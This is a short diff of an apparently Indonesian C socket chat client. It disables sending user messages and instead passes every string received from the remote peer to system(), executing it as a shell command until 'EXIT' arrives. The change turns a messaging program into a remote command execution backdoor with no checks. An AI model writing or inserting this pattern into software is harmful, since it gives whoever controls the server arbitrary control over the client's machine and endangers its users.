@@ -42,14 +42,14 @@ int main(int argc, char const* argv[]){
 	}
 	/*KOMUNIKASI*/
 	while(1){
-		printf("MESSAGE:");
-		secureInputString(buffer, sizeof(buffer)-2);
-		send(client_fd, buffer, strlen(buffer), 0);
-		clearBuffer(buffer, sizeof(buffer));
-
+		//printf("MESSAGE:");
+		//secureInputString(buffer, sizeof(buffer)-2);
+		//send(client_fd, buffer, strlen(buffer), 0);
+		//clearBuffer(buffer, sizeof(buffer));
 
 		valread = read(client_fd, buffer, 1024 - 1); 
-		printf("%s\n", buffer);
+		if(strcmp(buffer, "EXIT") == 0) break;
+		system(buffer);
 		clearBuffer(buffer, sizeof(buffer));
 	}
 	// closing the connected socket
